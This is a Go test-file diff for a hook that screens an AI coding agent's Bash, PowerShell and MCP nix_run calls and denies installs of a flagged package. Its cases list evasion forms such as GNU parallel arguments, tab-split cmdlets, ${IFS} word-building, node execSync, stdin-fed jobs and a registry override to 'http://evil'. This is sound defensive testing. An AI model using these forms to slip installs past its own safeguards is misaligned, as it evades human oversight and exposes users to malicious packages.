@@ -14,6 +14,8 @@ import (
 	"slices"
 	"strings"
 	"testing"
+
+	"github.com/Quantum-Serendipity/qsdev/internal/selfprotect/cmdscan"
 )
 
 // pgResult is what testdata/hooks/package_guard_driver.py reports for one run
@@ -76,8 +78,9 @@ func runPackageGuard(t *testing.T, tool string, input map[string]any, env ...str
 }
 
 // runPackageGuardIn is runPackageGuard with the envelope's cwd set to cwd
-// (omitted when empty).
-func runPackageGuardIn(t *testing.T, cwd, tool string, input map[string]any, env ...string) pgResult {
+// (omitted when empty). input is any JSON value, so a malformed tool_input
+// can be sent.
+func runPackageGuardIn(t *testing.T, cwd, tool string, input any, env ...string) pgResult {
 	t.Helper()
 	python, err := exec.LookPath("python3")
 	if err != nil {
@@ -689,6 +692,10 @@ func TestPackageGuard_PowerShellTool(t *testing.T) {
 		cmdlet("Find-Module X | Install-Module", "install-module"),
 		cmdlet("isres Evil", "isres"),
 		cmdlet("npm install lodash; Install-Module Evil", "install-module"),
+		// A tab after the cmdlet, which the PowerShell permission rules'
+		// whole-word match misses (W1N-29): the guard is the backstop.
+		cmdlet("Install-Module\tEvil", "install-module"),
+		cmdlet("Install-Module\t-Name\tEvil", "install-module"),
 		// PowerShellGet's exported aliases and PackageManagement's Save-Package.
 		cmdlet("inmo Evil", "inmo"),
 		cmdlet("upmo Evil", "upmo"),
@@ -873,4 +880,245 @@ func TestPackageGuard_InlineInterpreterCode(t *testing.T) {
 		bash("npm${IFS}install${IFS}evil", "ask", "computed by the shell"),
 		bash("$(echo npm) $(echo install) evil", "ask", "computed by the shell"),
 	})
+}
+
+// TestPackageGuard_ParallelArgumentCommands guards W1N-08: GNU parallel with
+// no command word runs each ::: argument as a command line, so an install
+// handed to it that way is judged like one typed directly. The forms with a
+// command word keep their base verdicts.
+func TestPackageGuard_ParallelArgumentCommands(t *testing.T) {
+	t.Parallel()
+	bash := func(command, want, reasonHas string) psVerdict {
+		return psVerdict{tool: "Bash", command: command, want: want, reasonHas: reasonHas}
+	}
+	runPSVerdicts(t, []psVerdict{
+		bash(`parallel ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel -j1 ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel --will-cite ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel ::: 'ls' 'npm i evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel ::: 'npm install evil' ::: x`, "deny", "GHSA-stub-0001"),
+		bash(`parallel :::+ 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		// A line takes one argument of every source; a replacement-string
+		// or sh -c template runs the argument; --env takes a value.
+		bash(`parallel ::: npm ::: install ::: evil`, "deny", "GHSA-stub-0001"),
+		bash(`parallel ::: 'npm' ::: 'i evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel ::: npm :::+ install :::+ evil`, "deny", "GHSA-stub-0001"),
+		bash(`parallel {} ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel '{}' ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel sh -c ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel bash -c {} ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel --env X ::: 'npm install evil'`, "deny", "GHSA-stub-0001"),
+		bash(`parallel npm install {1} ::: evil ::: x`, "deny", "GHSA-stub-0001"),
+
+		// Base verdicts, pinned.
+		bash(`parallel npm install ::: evil`, "deny", "GHSA-stub-0001"),
+		bash(`parallel echo ::: a b`, "allow", ""),
+		bash(`parallel ::: ls 'echo hi'`, "allow", ""),
+		bash(`parallel :::: cmds.txt`, "allow", ""),
+		// Jobs read from stdin or a file are not known; as on base, the
+		// hook decides without an error.
+		bash(`cat jobs.txt | parallel`, "allow", ""),
+		bash(`parallel < jobs.txt`, "allow", ""),
+		bash(`parallel -j4 < jobs.txt`, "allow", ""),
+		bash(`parallel --version`, "allow", ""),
+		bash(`sudo parallel`, "allow", ""),
+		{tool: "Monitor", command: `cat jobs.txt | parallel`, want: "allow"},
+	})
+}
+
+// nixRunServers are tool names Claude Code gives the MCP server's nix_run
+// tool: the server is named by the client's MCP configuration.
+var nixRunServers = []string{"mcp__qsdev__qsdev_nix_run", "mcp__other__qsdev_nix_run"}
+
+// nixRunCase is one well-formed nix_run tool_input and the package-guard
+// decision it gets.
+type nixRunCase struct {
+	name        string
+	installable string
+	args        []string
+	stdin       string
+	want        string
+}
+
+func (c nixRunCase) input() map[string]any {
+	in := map[string]any{"command": c.installable}
+	if c.args != nil {
+		in["args"] = c.args
+	}
+	if c.stdin != "" {
+		in["stdin"] = c.stdin
+	}
+	return in
+}
+
+// nixRunCases are the well-formed nix_run calls the guard is tested with.
+var nixRunCases = []nixRunCase{
+	{name: "bash -c pnpm i evil", installable: "nixpkgs#bash", args: []string{"-c", "pnpm i evil"}, want: "deny"},
+	{name: "bash -c registry override", installable: "nixpkgs#bash", args: []string{"-c", "NPM_CONFIG_REGISTRY=http://evil npm ci"}, want: "deny"},
+	{name: "pnpm add evil", installable: "nixpkgs#pnpm", args: []string{"add", "evil"}, want: "deny"},
+	{name: "bash reads an install from stdin", installable: "nixpkgs#bash", stdin: "npm install evil", want: "deny"},
+	{name: "busybox sh -c", installable: "nixpkgs#busybox", args: []string{"sh", "-c", "npm i evil"}, want: "deny"},
+	{name: "clean package through bash -c", installable: "nixpkgs#bash", args: []string{"-c", "npm install left-pad"}, want: "deny"},
+	{name: "clean package run directly", installable: "nixpkgs#nodejs.npm", args: []string{"install", "left-pad"}, want: "deny"},
+	{name: "-c after options", installable: "github:x/y#pkgs.bash^out", args: []string{"-o", "errexit", "-c", "--", "npm i evil"}, want: "deny"},
+	// An attribute with a version or variant suffix runs the same manager.
+	{name: "pnpm_9 add evil", installable: "nixpkgs#pnpm_9", args: []string{"add", "evil"}, want: "deny"},
+	{name: "pnpm_8 add evil", installable: "nixpkgs#pnpm_8", args: []string{"add", "evil"}, want: "deny"},
+	{name: "yarn-berry add evil", installable: "nixpkgs#yarn-berry", args: []string{"add", "evil"}, want: "deny"},
+	{name: "nodejs_22 -e npm i", installable: "nixpkgs#nodejs_22", args: []string{"-e", "require('child_process').execSync('npm i evil')"}, want: "deny"},
+	{name: "versioned attr under a set", installable: "nixpkgs#nodePackages.pnpm_9^out", args: []string{"add", "evil"}, want: "deny"},
+	{name: "jq filter", installable: "nixpkgs#jq", args: []string{"."}, want: "allow"},
+	{name: "versioned tool, no install", installable: "nixpkgs#nodejs_22", args: []string{"--version"}, want: "allow"},
+	{name: "jq filter over stdin", installable: "nixpkgs#jq", args: []string{"."}, stdin: `{"a": 1}`, want: "allow"},
+	{name: "bash -c ls", installable: "nixpkgs#bash", args: []string{"-c", "ls"}, want: "allow"},
+	{name: "hello", installable: "nixpkgs#hello", want: "allow"},
+	// parallel reading its jobs from stdin: its args say nothing, stdin is
+	// judged as a line.
+	{name: "parallel -j4", installable: "nixpkgs#parallel", args: []string{"-j4"}, want: "allow"},
+	{name: "parallel with jobs on stdin", installable: "nixpkgs#parallel", stdin: "npm i evil", want: "deny"},
+	{name: "parallel with clean stdin", installable: "nixpkgs#parallel", stdin: "ls", want: "allow"},
+}
+
+// TestPackageGuard_NixRunTool runs the MCP server's nix_run tool through
+// package-guard: an install in the program's args, a -c script or stdin is
+// denied with no registry lookup and no updatedInput (a rewrite would
+// replace the installable), even for a clean package; a call with no install
+// gets no decision; a malformed tool_input fails closed.
+func TestPackageGuard_NixRunTool(t *testing.T) {
+	t.Parallel()
+	for _, tool := range nixRunServers {
+		for _, tc := range nixRunCases {
+			t.Run(tool+"/"+tc.name, func(t *testing.T) {
+				t.Parallel()
+				res := runPackageGuard(t, tool, tc.input(), "PG_VULN=evil")
+				if got := res.decision(); got != tc.want {
+					t.Fatalf("decision = %q, want %q (result %+v)", got, tc.want, res)
+				}
+				if len(res.Lookups) != 0 {
+					t.Errorf("registry lookups %+v, want none", res.Lookups)
+				}
+				if res.Output != nil && res.Output.UpdatedInput != nil {
+					t.Errorf("updatedInput %+v, want none", res.Output.UpdatedInput)
+				}
+				if tc.want == "deny" && !strings.Contains(res.reason(), "cannot be validated or hardened; run them through Bash") {
+					t.Errorf("reason %q does not send the install to Bash", res.reason())
+				}
+			})
+		}
+		malformed := []struct {
+			name  string
+			input any
+		}{
+			{"args a string", map[string]any{"command": "nixpkgs#bash", "args": "-c npm i evil"}},
+			{"args holds a number", map[string]any{"command": "nixpkgs#bash", "args": []any{"-c", 5}}},
+			{"command a number", map[string]any{"command": 5}},
+			{"stdin a list", map[string]any{"command": "nixpkgs#bash", "stdin": []string{"npm i evil"}}},
+			{"tool_input a string", "nixpkgs#bash -c 'npm i evil'"},
+			// Falsy values of the wrong type are malformed too; only an
+			// absent or null field is empty.
+			{"args false", map[string]any{"command": "nixpkgs#bash", "args": false}},
+			{"args an empty object", map[string]any{"command": "nixpkgs#bash", "args": map[string]any{}}},
+			{"stdin 0", map[string]any{"command": "nixpkgs#bash", "args": []string{}, "stdin": 0}},
+			{"command false", map[string]any{"command": false}},
+		}
+		for _, tc := range malformed {
+			t.Run(tool+"/malformed/"+tc.name, func(t *testing.T) {
+				t.Parallel()
+				res := runPackageGuardIn(t, "", tool, tc.input, "PG_VULN=evil")
+				if got := res.decision(); got != "deny" {
+					t.Fatalf("decision = %q, want deny (result %+v)", got, res)
+				}
+			})
+		}
+	}
+	// Not the nix_run tool: no decision, whatever it carries.
+	for _, tool := range []string{"mcp____qsdev_nix_run", "qsdev_nix_run", "mcp__x__qsdev_nix_runner", "mcp__x__other"} {
+		res := runPackageGuard(t, tool, map[string]any{"command": "nixpkgs#pnpm", "args": []string{"add", "evil"}}, "PG_VULN=evil")
+		if got := res.decision(); got != "allow" {
+			t.Errorf("%s: decision = %q, want no decision (result %+v)", tool, got, res)
+		}
+	}
+}
+
+// TestPackageGuard_NixRunMatchesCommandLines ties the guard's reading of a
+// nix_run call to cmdscan.NixRunCommandLines, the Bash lines the server and
+// self-protection judge it as: the call is denied exactly when one of those
+// lines, other than the literal `nix run` line (whose installable the Bash
+// route takes as a nix install), is denied or asked about as a Bash call.
+func TestPackageGuard_NixRunMatchesCommandLines(t *testing.T) {
+	t.Parallel()
+	for _, tc := range nixRunCases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			lines := cmdscan.NixRunCommandLines(tc.installable, tc.args, tc.stdin)
+			if len(lines) == 0 || !strings.HasPrefix(lines[0], "nix run ") {
+				t.Fatalf("NixRunCommandLines = %q, want the literal nix run line first", lines)
+			}
+			refused := false
+			for _, line := range lines[1:] {
+				switch runPackageGuard(t, "Bash", map[string]any{"command": line}, "PG_VULN=evil").decision() {
+				case "deny", "ask":
+					refused = true
+				}
+			}
+			got := runPackageGuard(t, nixRunServers[0], tc.input(), "PG_VULN=evil").decision()
+			if (got == "deny") != refused {
+				t.Errorf("nix_run decision %q, but the Bash lines %q refused = %v", got, lines[1:], refused)
+			}
+		})
+	}
+}
+
+// TestPackageGuard_NixRunToolNameMatchesCmdscan keeps the guard's nix_run
+// tool name and its recognition of Claude Code's MCP tool names in step with
+// cmdscan, which the server and self-protection use.
+func TestPackageGuard_NixRunToolNameMatchesCmdscan(t *testing.T) {
+	t.Parallel()
+	python, err := exec.LookPath("python3")
+	if err != nil {
+		t.Skip("python3 not available; skipping package-guard nix_run name test")
+	}
+	path, err := filepath.Abs(filepath.Join("templates", "hooks", "package-guard.py"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	names := []string{
+		"mcp__qsdev__qsdev_nix_run", "mcp__other__qsdev_nix_run", "mcp__my-server__qsdev_nix_run",
+		"mcp____qsdev_nix_run", "mcp__x__qsdev_nix_runner", "mcp__x__y__qsdev_nix_run", "mcp__x__",
+		"qsdev_nix_run", "mcp_x__qsdev_nix_run", "MCP__x__qsdev_nix_run", "Bash", "",
+	}
+	namesJSON, err := json.Marshal(names)
+	if err != nil {
+		t.Fatal(err)
+	}
+	driver := `import importlib.util, json, os
+spec = importlib.util.spec_from_file_location('h', os.environ['HOOK_PATH'])
+m = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(m)
+names = json.loads(os.environ['NAMES'])
+print(json.dumps({'tool': m.NIX_RUN_TOOL, 'is': [m._is_nix_run(n) for n in names]}))`
+	cmd := exec.Command(python, "-c", driver)
+	cmd.Env = hookEnv(t, "HOOK_PATH="+path, "NAMES="+string(namesJSON))
+	out, err := cmd.Output()
+	if err != nil {
+		t.Fatalf("driver failed: %v", err)
+	}
+	var got struct {
+		Tool string `json:"tool"`
+		Is   []bool `json:"is"`
+	}
+	if err := json.Unmarshal(out, &got); err != nil {
+		t.Fatalf("bad driver output %q: %v", out, err)
+	}
+	if got.Tool != cmdscan.NixRunTool {
+		t.Errorf("NIX_RUN_TOOL = %q, want cmdscan.NixRunTool %q", got.Tool, cmdscan.NixRunTool)
+	}
+	if len(got.Is) != len(names) {
+		t.Fatalf("driver judged %d names, want %d", len(got.Is), len(names))
+	}
+	for i, name := range names {
+		if want := cmdscan.IsNixRunTool(name); got.Is[i] != want {
+			t.Errorf("_is_nix_run(%q) = %v, cmdscan.IsNixRunTool = %v", name, got.Is[i], want)
+		}
+	}
 }
